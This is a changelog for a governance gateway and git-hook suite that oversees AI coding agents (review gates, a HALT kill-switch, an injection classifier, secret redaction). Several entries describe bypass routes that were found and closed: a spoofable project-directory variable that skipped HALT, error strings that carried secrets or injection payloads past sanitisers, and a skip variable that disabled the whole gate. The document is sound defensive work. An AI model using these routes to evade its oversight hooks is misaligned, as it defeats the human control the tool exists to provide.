    names `.rea/serve.state.json` as the live source. New sections
    describe the `__rea__health` meta-tool with default-safe payload
    and the `gateway.health.expose_diagnostics` opt-in, the 0.9.0
    gateway supervisor + SESSION_BLOCKER tracker, the 0.6.1 cross-repo
    guard via `git --git-common-dir`, the 0.6.2 script-anchor fallback
    (BUG-012, scoped to the review-gate hooks — the remaining hooks
    still derive `REA_ROOT` from `${CLAUDE_PROJECT_DIR:-$(pwd)}` and
    that caveat is now called out explicitly), the 0.7.0 shared
    push-review core + native git adapter, 0.8.0 Codex-only waiver
    semantics with cache-gate hardening, 0.3.0 `${VAR}` env
    interpolation with redact-by-default, and the 0.3.0 G9 three-tier
    injection classifier (verdicts `clean` / `suspicious` /
    `likely_injection`) with the strict flag. Middleware-chain diagram
    corrected to place `injection` below the EXECUTE bar (it is a
    post-execute middleware that scans `ctx.result`, not arguments).
    Hook inventory corrected: 14 scripts total ship, 12 registered in
    the default `.claude/settings.json`; the remaining two
    (`commit-review-gate.sh` as a `PreToolUse: Bash` hook matching
    `git commit`, and `push-review-gate-git.sh` as a native-git adapter
    sourcing `hooks/_lib/push-review-core.sh` for consumers who wire a
    wrapper-based `.husky/pre-push`) are shipped ready-to-wire but
    intentionally not registered by default. `rea init`'s default
    installer still emits a standalone inline `.husky/pre-push` body
    (`src/cli/install/pre-push.ts`) rather than a wrapper around the
    adapter; shared-core unification for the husky path is tracked as
    follow-up hardening. Protected-path push-review-gate behavior
    described correctly as hard-block (exit 2) rather than
    advisory-warn, with the Codex waiver documented as the only way
    through the protected-path branch without a fresh `codex.review`
    audit entry; the review cache is a separate later check scoped to
    non-protected-path pushes. `rea doctor` description rewritten to
    list actual checks (`.rea/` dir, policy, registry, agents, hooks,
    `.claude/settings.json`, commit-msg, pre-push, Codex, fingerprint
    store); removed false `.mcp.json` and audit-hash-chain claims.
    Policy reference table adds review/injection/gateway/redact knobs.
  - **THREAT_MODEL.md**: header bumped to 0.9.x / 2026-04-21.
    §5.8 rewritten to describe current Codex-only waiver semantics;
    cache-gate hardening scoped correctly to the general (non-protected-
    path) gate rather than the protected-path branch. §6 residual-risks
    table marks shipped items, promotes surviving risks, and restores
    "Catalog drift by downstream not detected on reconnect" as an ACTIVE
    residual risk (the G7 TOFU fingerprint pins registry CONFIG, not
    the `tools/list` response, so catalog drift falls through). New
    sections §5.14 (supervisor trust boundary), §5.15 (SESSION_BLOCKER
    audit semantics), §5.16 (`serve.state.json` atomic writer +
    lock-guarded owner_pid handoff), §5.17 (BUG-011 health payload
    sanitization — the opt-in sanitizer collapses any non-`clean`
    diagnostic to the exported `<redacted: suspected injection>`
    placeholder, full diagnostic still flows into the meta-tool audit
    record sourced pre-sanitize from `pool.healthSnapshot()` inside
    `server.ts`), §5.18 (BUG-012 script-anchor trust boundary —
    `CLAUDE_PROJECT_DIR` is advisory-only for the review-gate hooks
    only), §5.19 (BUG-013 tarball-smoke security-claim gate +
    dist-regression; §5.19 husky-e2e description corrected to reflect
    that the shipped `.husky/pre-push` is the inline body emitted by
    `src/cli/install/pre-push.ts`, with one case swapping in a
    wrapper around `push-review-gate-git.sh` as shape-guard for the
    future installer path), §5.20 (G7 TOFU — REWRITTEN to describe the
    path-only registry-config fingerprint that ships in
    `src/registry/fingerprint.ts`: hashes `name` + `command` + `args`
    - env KEY SET + `env_passthrough` + `tier_overrides`, explicitly
      NOT tool-surface and NOT binary), §5.21 (G9 three-tier injection
      classifier — verdicts are `clean` / `suspicious` /
      `likely_injection`). §7 defense-in-depth summary updated to match
      the corrected hook-inventory framing. Source file refs corrected
      to actual paths (`src/gateway/server.ts`,
      `src/gateway/downstream.test.ts`).
  - **SECURITY.md**: supported-versions matrix updated to 0.9.x active /
    0.8.x critical-fixes-only / older superseded. Hook count and
    registration nuance aligned with the README. `set -euo pipefail`
    claim tightened to cover the `set -uo pipefail` variant used by
    stdin-JSON hooks. Adds pointer to §5.18 for the script-anchor
    trust model.
  - **CLAUDE.md**: managed block reflects current policy state (4
    blocked_paths, not 8). Project status updated to 0.9.x. Hook
    reference now lists the Claude-Code + native-git push adapters
    separately, describes the shared `_lib/push-review-core.sh`, and
    calls out that the default `rea init` husky installer still emits
    an inline pre-push body rather than a wrapper.
  - **MIGRATION-0.5.0.md**: forward-pointer added at the top flagging
    the 0.8.0 `REA_SKIP_CODEX_REVIEW` narrowing as the one breaking
    semantic between 0.5.0 and 0.9.0.
  - **src/cli/status.ts**: top-of-file docblock updated to describe the
    0.9.0 per-downstream live block and the terminal-escape sanitizer on
    disk-sourced fields.
  - **.rea/policy.yaml**: removes `THREAT_MODEL.md`, `SECURITY.md`,
    `CODEOWNERS`, and `.rea/policy.yaml` from the dogfood install's
    `blocked_paths`. Per-file post-change enforcement:
    - `.rea/policy.yaml` — still locally gated by
      `settings-protection.sh` (hardcoded). No change in local
      enforcement.
    - `SECURITY.md`, `THREAT_MODEL.md`, `CODEOWNERS` — local hook gate
      removed. Enforcement is now CODEOWNERS + DCO + branch protection
      at the GitHub layer only. Intentional — these are maintainer-
      authored reference docs and the prior double-gate created a
      chicken-and-egg problem when `THREAT_MODEL.md` itself needed an
      update.

    Always-blocked invariants (`.env`, `.env.*`, `.rea/HALT`,
    `.github/workflows/release.yml`) remain in place.

## 0.9.0

### Minor Changes

- e43d96e: Gateway supervisor, SESSION_BLOCKER events, and per-downstream `rea status`
  (BUG-002..006, T2.4 from 0.6.2 deferred).

  Before this release, a downstream MCP child that crashed left the gateway's
  circuit breaker flapping open → half-open → open against the zombie client.
  The half-open probe reused the dead handle, received `Not connected`, and
  re-opened the circuit without ever respawning the child. Operators had no
  live view of which downstream had wedged: `rea status` only surfaced
  session-wide fields, and `__rea__health` was only reachable over the MCP
  transport that had (often) already broken.

  Changes:
  - **Supervisor / respawn** — `DownstreamConnection` now wires `onclose` and
    `onerror` on the MCP SDK transport. Unexpected closes null the client and
    transport eagerly so the next `callTool` forces a genuine reconnect
    rather than calling into a stale handle. `Not connected` errors are
    promoted to the respawn path with the same eager invalidation. Intentional
    `close()` is gated so it does not double-count as an unexpected death.
  - **SESSION_BLOCKER event** — new `SessionBlockerTracker` subscribes to
    circuit-breaker `onStateChange` events, counts circuit-open transitions
    per (session_id, server_name), and emits a single LOUD `SESSION_BLOCKER`
    log record plus audit entry when the threshold (default: 3) is crossed.
    Recovery resets the counter and re-arms the emit; a new session drops
    every counter. Further opens within an armed window do NOT re-fire.
  - **Live `rea status`** — the gateway now publishes `serve.state.json`
    with a `downstreams` block on every circuit-breaker transition and
    supervisor event, coalesced through a 250 ms debounce and written
    atomically via temp+rename. `rea status` (both pretty and `--json`)
    surfaces per-downstream `circuit_state`, `retry_at`, `connected`,
    `healthy`, `last_error`, `tools_count`, `open_transitions`, and
    `session_blocker_emitted`. Legacy state files without a `downstreams`
    key degrade to a null field and a hint to upgrade the gateway.

  No API removals. New gateway options (`liveStateFilePath`,
  `liveStateSessionId`, `liveStateStartedAt`, `liveStateMetricsPort`,
  `liveStateLastErrorRedactor`) and new `GatewayHandle` fields
  (`livePublisher`, `sessionBlocker`) are additive and optional.
  `liveStateLastErrorRedactor` scrubs downstream error strings before they
  land in `serve.state.json`; `rea serve` wires it automatically to the
  same `buildRegexRedactor` the gateway logger uses.

## 0.8.0

### Minor Changes

- 5433023: Narrow `REA_SKIP_CODEX_REVIEW` from a whole-gate bypass to a Codex-only waiver (#85).

  Through 0.7.0, setting `REA_SKIP_CODEX_REVIEW=<reason>` short-circuited the entire push-review gate after writing the skip audit record — equivalent in scope to `REA_SKIP_PUSH_REVIEW`. Operators reached for it to silence a transient Codex unavailability and accidentally bypassed every other check (HALT, cross-repo guard, ref-resolution, push-review cache).

  Starting in 0.8.0, the waiver only satisfies the protected-path Codex-audit requirement (section 7). Every other gate this hook runs still runs:
  - **HALT** (`.rea/HALT`) — still blocks.
  - **Cross-repo guard** — still blocks.
  - **Ref-resolution failures** (missing remote object, unresolvable source ref) — still block, but the skip audit record is written first so the operator's commitment is durable.
  - **Push-review cache** — a miss still falls through to the general "Review required" block in section 9.

  (Blocked-paths enforcement runs on a separate Edit/Write-tier hook, not this push hook — it was never scoped by `REA_SKIP_CODEX_REVIEW` and is unaffected by this change.)

  **Migration.** For the previous whole-gate bypass semantic, use `REA_SKIP_PUSH_REVIEW=<reason>` (unchanged). For a protected-path push where Codex is genuinely unavailable, `REA_SKIP_CODEX_REVIEW=<reason>` combined with a valid push-review cache entry (from `rea cache set <sha> pass ...`) is the new minimum for exit 0.

  **Audit.** The skip audit record is still named `codex.review.skipped` and still fails the `codex.review` jq predicate. Banner text changed from `CODEX REVIEW SKIPPED` to `CODEX REVIEW WAIVER active` to reflect the narrower scope.

  **Cache gate hardening (same release).** Two composition bugs that became load-bearing under the new waiver semantic were fixed at the same time:
  - The cache-hit predicate now requires `.hit == true and .result == "pass"`. Previously `.hit == true` alone was sufficient, which meant a cached `fail` verdict would silently satisfy the gate. Under the 0.7.0 semantic the waiver short-circuited to exit 0 on its own, so the cache lookup was not load-bearing for waiver users; under 0.8.0 the cache is the only path to exit 0 for waiver users, making the permissive predicate a real exposure.
  - The cache key is now derived from the PUSHED source ref (from pre-push stdin), not from the checkout branch. `git push origin hotfix:main` from a `feature` checkout now looks up a cache entry keyed on `hotfix`, not `feature`.

  Closes the "Codex waiver accidentally bypasses HALT" class of operator footguns. The old semantic was shipped as a workaround in 0.3.x before the general gate composed cleanly; 0.8.0 is the cleanup pass.

## 0.7.0

### Minor Changes

- 5ffece8: 0.7.0 — BUG-008 cleanup, BUG-013/014 defense-in-depth, release-pipeline hardening, CI regression guards
  - **BUG-008 cleanup — shared push-review core + native git adapter.** The
    700-line `push-review-gate.sh` and `commit-review-gate.sh` hooks shared
    no implementation. Two bugs in the same body of logic meant two fixes
    in two places. 0.7.0 extracts the common logic into
    `hooks/_lib/push-review-core.sh` (sourced by thin adapters) and ships
    a new `hooks/push-review-gate-git.sh` that consumers wire into
    `.husky/pre-push` directly. The adapter consumes git's native pre-push
    stdin (`<ref> <sha> <ref> <sha>` per line) without needing the
    BUG-008 sniff in the generic adapter. Existing consumers of
    `push-review-gate.sh` are unaffected — the sniff still works. Full
    parity test matrix verifies the two adapters produce identical
    exit codes + load-bearing stderr across every core branch.
  - **BUG-014 (structural defense-in-depth):** `DownstreamConnection.lastError`
    is now bounded at write, not at read. 0.6.2 applied
    `boundedDiagnosticString` at the getter — every assignment site was
    trusted to eventually flow through the read path. 0.7.0 moves the
    bound into a `set #lastErrorMessage` setter on a true ES-private
    backing field, so the invariant is structural: every write produces
    a bounded stored value regardless of how many assignment sites exist
    or where they live. The setter also rejects non-string inputs with
    `TypeError` instead of silently corrupting the field. Public API is
    unchanged (`get lastError(): string | null`).
  - **Release-pipeline hardening (BUG-013 follow-through):**
    `.github/workflows/release.yml` now (a) rebuilds `dist/` from the
    shipping HEAD immediately before `changesets/action` and records a
    SHA-256 tree hash to `$RUNNER_TEMP/rea-dist-hash`, and (b)
    post-publish, re-packs the just-published tarball from npm and fails
    the release if the published tarball's `dist/` tree hash doesn't
    match the CI-built hash. The hash file lives in CI scratch space so
    it cannot be accidentally committed by `changesets/action`'s
    `git add .`.
  - **Class-level dist/ regression gate (generalizes BUG-013):** new
    `scripts/dist-regression-gate.sh` + `dist-regression` CI job fire on
    every PR and every push:main. If `src/` has changed vs the last
    published tag but the rebuilt `dist/` tree hashes identically to the
    published tarball, CI fails. The 0.6.0 → 0.6.1 "src changed, dist
    didn't" regression class is now caught BEFORE the release branch,
    not only at publish time. Skip surface designed so registry outages
    and malformed prior releases don't pin CI into red.
  - **Husky e2e regression guard:** new
    `__tests__/hooks/husky-e2e.test.ts` invokes a REAL `git push` against
    a bare remote via `core.hooksPath=.husky`, with the SHIPPED
    `.husky/pre-push` in place. The eight-test matrix validates the full
    plumbing (protected-path block, clean pass, HALT, waiver,
    `review.codex_required: false`, counterfactual noop hook,
    native-adapter wrapper shape, `.claude/hooks/` PROTECTED_RE
    alternative) — the kind of BUG-008 silent-exit-0 regression that
    slipped past synthesized-stdin unit tests through 0.4.0 would now
    fail loudly.
  - **push-review-gate ordering (0.7.0 follow-up to BUG-009):**
    `REA_SKIP_CODEX_REVIEW` now resolves before ref-resolution, so the
    bypass works on stale checkouts where the remote ref has gone
    missing (previously a bogus remote SHA would crash the gate before
    the skip could fire). The skip still honors policy: if
    `review.codex_required: false`, the env var is a no-op (unchanged
    G11.4 semantic). Skip audit metadata is now parsed from the pre-push
    stdin contract (`<local_ref> <local_sha> <remote_ref> <remote_sha>`)
    rather than guessed from `git rev-parse HEAD`, so
    `git push origin hotfix:main` from a `feature` checkout now
    correctly records the `hotfix` SHA in the skip receipt.
    `files_changed` in skip records is `null` (authoritative push window
    is unavailable pre-ref-resolution); a new `metadata_source` field
    tags the record as `prepush-stdin` or `local-fallback`.
  - **Master-default fork support (C1):** new-branch push (remote SHA =
    zero) now probes `origin/HEAD` → `origin/main` → `origin/master` via
    `git rev-parse --verify` before falling back. Earlier versions
    hard-coded `origin/main` as the merge-base anchor, which fails-closed
    noisy on master-default forks. `.husky/pre-push` and
    `hooks/_lib/push-review-core.sh` share the same probe order.
  - **Fail-closed on empty merge-base (`.husky/pre-push`):** a genuine
    merge-base resolution failure between two known SHAs (e.g. unrelated
    histories, transient git failure) now blocks the push with a
    diagnostic instead of silently continuing. The bootstrap scenario —
    first push to an empty remote with no remote-tracking ref — is
    distinguished from the failure path and skipped cleanly, since there
    is no baseline to diff against.
  - **Zero-SHA regression coverage (C2):** three new tests in
    `push-review-gate-git-adapter.test.ts` exercise the new-branch
    zero-SHA path (`refs/heads/feature <sha> refs/heads/feature 0000...`)
    across all probe permutations — `origin/HEAD` set, `origin/HEAD`
    absent with `origin/main` present, and `origin/HEAD` + `origin/main`
    both absent with `origin/master` present (C1 fallback).
  - **Bare-remote tempdir cleanup (C3):** three push-review-gate test
    suites (`no-codex`, `escape-hatch`, `skip-push-review`) now track
    both the scratch repo and its bare remote in the cleanup list. Prior
    versions only cleaned the scratch repo; the bare remote leaked across
    CI runs. A `track(repo)` helper centralizes the pattern.
  - **THREAT_MODEL §5.2a:** documents `CLAUDE_PROJECT_DIR` as
    advisory-only — the script-anchor idiom owns the trust decision,
    the env var is kept only for diagnostic signal.

## 0.6.2

### Patch Changes

- e4702da: [security] Helix team blocker clearance — BUG-011, BUG-012, BUG-013

  Three coordinated fixes shipped together so the Helix team (primary rea
  consumer) can merge their pending 0.6.0 upgrade PR.

  **BUG-011 (HIGH, security) — `__rea__health` meta-tool payload sanitization.**
  The meta-tool short-circuits the middleware chain (intentionally, so it stays
  callable under HALT) and previously serialized `halt_reason` and every
  `downstreams[].last_error` verbatim. Error strings from upstream MCPs could
  contain secrets (API keys, tokens) or prompt-injection payloads, neither of
  which was filtered because the redact + injection middleware does not run on
  the short-circuited response. Net effect: a redact + injection-sanitizer bypass
  callable precisely when HALT should be holding the line.

  Fix: the health response now has `halt_reason: null` and every
  `downstreams[].last_error: null` by default. Full diagnostic detail continues
  to flow into `rea doctor` (which reads `pool.healthSnapshot()` pre-sanitize)
  and into the meta-tool audit record — the entry written for
  `__rea__health` now carries `metadata.halt_reason` and
  `metadata.downstream_errors[]` alongside the existing counts. The audit log
  is on local disk, hash-chained append-only, and not LLM-reachable, so it is
  the correct sink for the trusted-operator diagnostic text. Operators who
  need the upstream error text on the MCP wire itself can opt in via
  `gateway.health.expose_diagnostics: true` in `.rea/policy.yaml`; opt-in mode
  still runs the sanitizer (redact + injection-classify with a placeholder
  replacement for suspected-injection strings). Diagnostic strings are bounded
  at 4096 UTF-16 code units before redact/inject scanning runs (with a UTF-8-
  safe truncate that drops trailing lone surrogates), so an adversarial
  downstream cannot DoS the tool by throwing oversize errors.

  Secondary: `meta.health.audit_failed` log elevated from `warn` to `error`, and
  `summary.audit_fail_count` is exposed in the snapshot so operators can detect
  an audit-sink failure without parsing stderr.

  New regression suite `src/gateway/meta/health-sanitize.test.ts` asserts that no
  combination of policy and HALT state can surface a synthetic secret or
  injection payload on the MCP wire, and that the redact-timeout sentinel never
  reaches the caller verbatim.

  **BUG-012 (MEDIUM, trust boundary) — script-location anchor for cross-repo
  guard.** The 0.6.1 cross-repo hook guard used
  `REA_ROOT=${CLAUDE_PROJECT_DIR:-$(pwd)}`. `CLAUDE_PROJECT_DIR` is
  caller-controlled, so any process that exported a foreign path could both
  bypass the gate AND bypass HALT.

  Fix: hooks now anchor `REA_ROOT` to the script's on-disk location via
  `BASH_SOURCE[0]` + `pwd -P`, then walk up to 4 parent directories looking for
  `.rea/policy.yaml` as the authoritative install marker. Fail-closed if no
  marker is found within the ceiling. `CLAUDE_PROJECT_DIR` is now treated as an
  advisory-only signal — if it is set and does not agree with the script-derived
  root, an advisory warning is printed and the script-derived value wins. The
  guard's cross-repo detection now compares the working directory's
  git-common-dir against the anchor's, fails closed on probe failure or on mixed
  git/non-git state, and falls back to path-prefix only when BOTH sides are
  non-git (the documented 0.5.1 escape-hatch scenario).

  Regression test in `__tests__/hooks/push-review-gate-cross-repo.test.ts` —
  BUG-012: foreign `CLAUDE_PROJECT_DIR` does NOT bypass HALT.

  **BUG-013 (HIGH, process) — release-pipeline dist/ verification.** 0.6.1 (tag)
  shipped with a `dist/` tree byte-identical to 0.6.0 — confirmed by Helix via
  `diff -qr`. Without a pipeline gate that rebuilds `dist/` from the shipping
  commit and verifies the published tarball contents, no future security
  changeset can be trusted.

  This release ships the in-repo half of the fix: `scripts/tarball-smoke.sh`
  now enforces a content-based security-claim gate. When any `.changeset/*.md`
  contains the `[security]` marker, the smoke requires that at least one
  `src/**/*(sanitize|security)*.test.ts` file exists AND that every named-import
  symbol it pulls from a relative path is present in the compiled `dist/` tree.
  The gate fails loudly (exit 2) if the marker is present but no testable
  security symbols are extractable — which is exactly the signal the 0.6.0→0.6.1
  regression would have produced, because the claimed fix would have to appear
  as at least one new test-referenced export under `dist/`.

  Pipeline-level rebuild-before-publish + post-publish tarball hash verification
  steps are drafted in `.rea/drafts-0.6.2/release-yml-patch.md` for hand-apply to
  `.github/workflows/release.yml` — CODEOWNERS blocks direct agent commits to
  that path, so those steps ship in a follow-up patch authored by a human
  maintainer. The tarball-smoke gate in this release is the bypass-resistant
  content check; the workflow-level hash verification is the defense-in-depth
  layer that will land alongside it.

## 0.6.1

### Patch Changes

- b32402c: fix(hooks): push/commit gates exit 0 when cwd is outside CLAUDE_PROJECT_DIR

  When `CLAUDE_PROJECT_DIR` points to the rea repo but the current working
  directory is a different repository (e.g. a Claude Code session rooted in rea
  upgrading a consumer project's `@bookedsolid/rea` dependency), the
  `push-review-gate.sh` and `commit-review-gate.sh` PreToolUse hooks now
  short-circuit with exit 0 so the foreign repo's `git push` / `git commit`
  proceeds unblocked.

  Pre-fix behavior: ref-resolution inside `resolve_argv_refspecs` ran
  `git rev-parse` inside `REA_ROOT` for refs that only existed in the consumer
  repo, hard-failing with `PUSH BLOCKED: could not resolve source ref`. That
  failure happened BEFORE the `REA_SKIP_PUSH_REVIEW` / `REA_SKIP_CODEX_REVIEW`
  escape hatches could be checked, leaving consumers with no documented way to
  unblock cross-repo work. Discovered during the 0.6.0 consumer upgrade wave.

  The guard uses `pwd -P` to compare real (symlink-resolved) paths; pushes from
  within rea itself or any of its subdirectories behave exactly as before.

## 0.6.0

### Minor Changes

- ccda930: feat(gateway): always expose `__rea__health` meta-tool for self-diagnostic

  The gateway now advertises a single gateway-internal tool, `__rea__health`,
  that is always present in `tools/list` regardless of downstream state. Calling
  it returns a structured snapshot of the gateway version, uptime, HALT state,
  policy summary, and per-downstream connection/health/tool-count — so an LLM
  session that sees an empty or suspicious catalog can ask the gateway _why_
  instead of guessing.

  The short-circuit handler bypasses the middleware chain (including the
  kill-switch) so the tool remains callable while HALT is active — this is the
  tool operators reach for when everything else is frozen. Every invocation
  still writes an audit record via `appendAuditRecord` so calls remain
  accountable.

  Downstream connections now track their most recent `lastError` message and
  expose an `isConnected` getter; the pool aggregates these via a new
  `healthSnapshot()` method. Stale successful `tools/list` counts are cached
  per-server so the health response can include counts even when a listing
  pass fails.

### Patch Changes

- ccda930: fix(doctor): skip git-hook checks when `.git/` is absent

  `rea doctor` no longer hard-fails on the `pre-push hook installed` check and
  no longer warns on the `commit-msg hook installed` check when the consumer's
  project is not a git repository. Instead, a single informational line —
  `[info] git hooks  (no '.git/' at baseDir — commit-msg / pre-push checks
skipped (not a git repo))` — replaces both checks, and `rea doctor` exits 0
  when all other checks pass.

  This matters for knowledge repos and other non-source-code projects that
  consume rea governance (policy, blocked paths, injection detection) but have
  no commits to gate. `rea init` already skipped commit-msg and pre-push
  install gracefully in a non-git directory; the doctor is now symmetric.

  Detection is done by a new exported helper `isGitRepo(baseDir)` that accepts
  all three real-world git-repo shapes — `.git/` directory (vanilla),
  `.git` file pointing at a valid gitdir (linked worktree / submodule), or
  a `.git` symlink to either of the above — and crucially **rejects stale
  gitlinks** whose target has been pruned. A submodule whose parent was moved
  or a linked worktree whose main repo was deleted both leave `.git` as a
  file with a `gitdir:` pointer to nowhere; `isGitRepo` returns false for
  these so the escape hatch kicks in the way operators expect.

  Security: removing `.git/` does not bypass governance. The governance
  artifact is the pre-push hook git invokes on `git push`; a directory with
  no `.git/` has no pushes to gate. `isGitRepo` is a UX predicate for
  doctor, not a trust boundary.

## 0.5.0

### Minor Changes

- edf6849: **fix(push-gate): BUG-008 pre-push stdin self-detect + BUG-009 `rea cache` subcommand + BUG-010 `.gitignore` scaffolding**

  The 0.3.x/0.4.0 push-review-gate silently became a no-op whenever a
  consumer wired it into `.husky/pre-push`. Git sends the pre-push
  stdin contract (`<ref> <sha> <ref> <sha>` lines), the gate expected
  Claude-Code JSON (`.tool_input.command`), the jq parse produced an
  empty `CMD`, and the `[[ -z "$CMD" ]]` early return fired. No review
  ran. Every pre-push invocation returned 0.

  This release ships the paired fix:
  - **BUG-008 self-detect** (`hooks/push-review-gate.sh`). When jq
    returns an empty command, the hook now sniffs the first non-blank
    stdin line for the git pre-push refspec shape. On match, it
    synthesizes `CMD="git push <argv-remote>"` so the existing step-6
    pre-push parser handles refspecs natively.
  - **BUG-009 `rea cache` subcommand**. `hooks/push-review-gate.sh:700`
    has called `rea cache check` since 0.3.x — but the subcommand was
    never shipped. Consumers hit `error: unknown command 'cache'`, the
    hook swallowed it to `{"hit":false}`, and every protected-path
    push re-ran Codex review. With BUG-008 fixed, the gate now actually
    fires on pre-push, so without the cache subcommand every protected
    push would deadlock. Ships together.

    New subcommands (`rea cache check|set|clear|list`) back a keyed
    JSONL store at `.rea/review-cache.jsonl`. Idempotent last-write-wins
    on `(sha, branch, base)`. TTL via `review.cache_max_age_seconds`
    (default 3600s).

  - **`REA_SKIP_PUSH_REVIEW` whole-gate escape hatch**
    (`.claude/hooks/push-review-gate.sh` only — the husky-side skip is
    deferred to a follow-up PR in the 0.5.0 window). Existing
    `REA_SKIP_CODEX_REVIEW` bypasses only the Codex-audit branch.
    `REA_SKIP_PUSH_REVIEW=<reason>` bypasses the entire gate — the
    recovery path for consumers deadlocked on a broken rea install
    (as BUG-009 created). Fail-closed: requires a built rea + git
    identity. Writes `tool_name: "push.review.skipped"` audit record.
    A skip does NOT satisfy the Codex-review jq predicate. The HALT
    check runs before the skip branch — `.rea/HALT` cannot be
    bypassed.
  - **BUG-010 `.gitignore` scaffolding** (`src/cli/install/gitignore.ts`,
    wired into `rea init` and `rea upgrade`). 0.3.x/0.4.0 `rea init`
    never added `.gitignore` entries for runtime artifacts (`rea serve`
    writes `.rea/fingerprints.json`, G1 rotates `audit-*.jsonl`, the
    new BUG-009 cache writes `review-cache.jsonl`). Every consumer
    saw these show up as untracked files. The scaffolder:
    - Writes a `# === rea managed ===`-bracketed block with every
      runtime artifact path in stable canonical order.
    - On existing `.gitignore`: appends the block after a blank-line
      separator (preserves all operator content).
    - On existing block: backfills missing entries in place
      (preserves operator additions inside the block).
    - `rea upgrade` runs the same scaffold, closing the gap for
      every consumer who installed before 0.5.0.
    - Refuses to write through a `.gitignore` symlink
      (supply-chain guard); warns and no-ops instead.
    - Match on block markers is anchored (full-line) — a substring
      match in a comment will not be reclassified as rea-managed.
  - **Codex F2 hardening** (0.5.0 PR1 adversarial review):
    - `review.allow_skip_in_ci` policy knob. `REA_SKIP_PUSH_REVIEW`
      refuses with exit 2 when `CI` is set unless the policy
      explicitly opts in. Closes the ambient-env-var bypass surface
      on shared build agents.
    - Skip audit records now carry an `os_identity` sub-object
      (uid, whoami, hostname, pid, ppid, ppid_cmd, tty, ci) so
      auditors can distinguish a real operator from a forged
      git-config actor.
  - **Codex F3 skew guard** (`src/cache/review-cache.ts`). A
    `recorded_at` more than 60s in the future of `nowMs` is treated
    as an expired miss. Prevents a tampered or severely-skewed clock
    from extending an approval indefinitely.
  - **Codex F4 atomic `clear`** (`src/cache/review-cache.ts`).
    Rewrites via temp-file + `fs.rename` (POSIX atomic within the
    directory) so unlocked readers (`lookup`, `list`) never observe a
    torn intermediate state during concurrent clears.

  Test coverage:
  - `src/cache/review-cache.test.ts` — 23 tests (round-trip, TTL,
    last-write-wins, clear, list, 20 concurrent writes, malformed
    lines, F3 future-skew guard, F4 atomic-clear concurrency)
  - `src/cli/cache.test.ts` — 11 tests (stdout contract, policy TTL,
    round-trip)
  - `__tests__/hooks/push-review-gate-prepush-stdin.test.ts` — 5 tests
    (BUG-008 self-detect, regression guards, `push_review: false` honor)
  - `__tests__/hooks/push-review-gate-skip-push-review.test.ts` — 12
    tests (fail-closed, audit record shape, skip != codex-review,
    pre-push stdin path, F1 HALT-first regression, F2 CI-refusal +
    CI-allowed + OS-identity capture)
  - `src/cli/install/gitignore.test.ts` — 13 tests (fresh-repo creation,
    append to existing, no-op on full block, backfill in-place,
    substring-spoof rejection, symlink refusal, no-trailing-newline
    input, shuffled entries, canonical list invariants)
  - `src/cli/init.test.ts` — 3 new BUG-010 regression tests (scaffold
    every artifact, idempotent re-init, preserves operator content)
  - `src/cli/upgrade.gitignore.test.ts` — 3 tests (backfill on older
    install, no-op when complete, dry-run does not touch)

## 0.4.0

### Minor Changes

- a27fc06: Registry `env:` values now support `${VAR}` interpolation.

  Registry entries can now reference process env vars via `${VAR}` syntax in the explicit `env:` map. Enables token-bearing MCPs (discord-ops, github, etc.) to route through rea-gateway without committing literal tokens to `registry.yaml` and without widening the restrictive `env_passthrough` allowlist. Missing vars fail the affected server at startup (fail-closed); the rest of the gateway still comes up. `env_passthrough` behavior is unchanged.

  ### Grammar (deliberately minimal)
  - Only `${VAR}` — curly-brace form in env **values**. Keys are never interpolated.
  - No bare `$VAR` (ambiguous with shell semantics).
  - No default syntax (`${VAR:-fallback}`) — kept out of the 0.3.0 surface.
  - No command substitution (`$(cmd)`) — never.
  - No recursive expansion. If `${FOO}` resolves to a string that itself contains `${BAR}`, the inner text is treated as a literal. This is intentional: a hostile env var's _contents_ cannot trigger further lookups.
  - Var names follow POSIX identifier rules: `^[A-Za-z_][A-Za-z0-9_]*$`. Empty `${}` or illegal identifier chars are rejected at load time with a clear error.

  ### Fail-closed on missing vars

  If any `${VAR}` referenced by an enabled server is unset at spawn time:
  - The affected server is marked unhealthy and skipped by the pool's tool list.
  - One stderr line per missing var is emitted with server + var context.
  - Every other server with resolved env still starts normally.
  - The gateway as a whole does not crash.

  ### Example

  ```yaml
  # .rea/registry.yaml
  version: '1'
  servers:
    - name: discord-ops
      command: npx
      args: ['-y', 'discord-ops@latest']
      env:
        BOOKED_DISCORD_BOT_TOKEN: '${BOOKED_DISCORD_BOT_TOKEN}'
        CLARITY_DISCORD_BOT_TOKEN: '${CLARITY_DISCORD_BOT_TOKEN}'
      enabled: true
  ```

  Export the tokens in the same shell that runs `rea serve`:

  ```bash
  export BOOKED_DISCORD_BOT_TOKEN="…"
  export CLARITY_DISCORD_BOT_TOKEN="…"
  rea serve
  ```

  ### Redact-by-default contract

  The template in `registry.yaml` is auditable (it commits); the runtime value is not. Env values resolve only inside `buildChildEnv` and pass straight to the child transport — they never flow into `ctx.metadata` or audit records. A new `secretKeys` signal identifies env entries that are secret-bearing (either because the key name matches `/(TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL)/i` or because a `${VAR}` reference in the value does), so any future telemetry path can make the right call without re-deriving the heuristic.

  ### Compatibility
  - `env_passthrough` semantics unchanged — still refuses secret-looking names at load time. The sanctioned path for secrets is now `env: { NAME: '${ENV_VAR}' }`.
  - Existing registries without interpolation continue to work unchanged.
  - No new dependencies.

- 6e84930: feat(gateway): G5 — gateway observability. Adds three user-visible surfaces:
  - `rea status` — new CLI command that reports live-process state for a
    running `rea serve` (pid, session id, metrics endpoint URL), the policy
    summary (profile, autonomy, blocked-paths count, codex_required, HALT), and
    audit log stats (lines, last timestamp, tail-hash smoke). Supports `--json`
    for composing with `jq` and future tooling. `rea check` remains the
    authoritative on-disk snapshot — `rea status` is the running-process view.
  - Structured JSON-lines gateway logger at `src/gateway/log.ts`. Honors
    `REA_LOG_LEVEL` (info default; debug/warn/error supported). Pretty-prints
    when stderr is a TTY, emits JSON lines on non-TTY sinks. No new deps —
    ~200-line no-dep implementation. `rea serve` wires the logger into
    connection open/close/reconnect events and circuit-breaker state transitions.
    `[rea-serve]` prefix preserved in pretty mode so existing grep-based smoke
    tests (helix) continue to match.
  - Optional loopback `/metrics` HTTP endpoint. Opt-in via `REA_METRICS_PORT`
    — no silent listeners. Binds `127.0.0.1` only, serves Prometheus text
    exposition, exposes per-downstream call/error/in-flight counters, audit
    lines appended, circuit-breaker state gauge, and a seconds-since-last-HALT
    gauge. Rejects non-GET methods with 405 and non-`/metrics` paths with 404
    (no request-path reflection in response bodies). `node:http` only — no
    express/fastify.

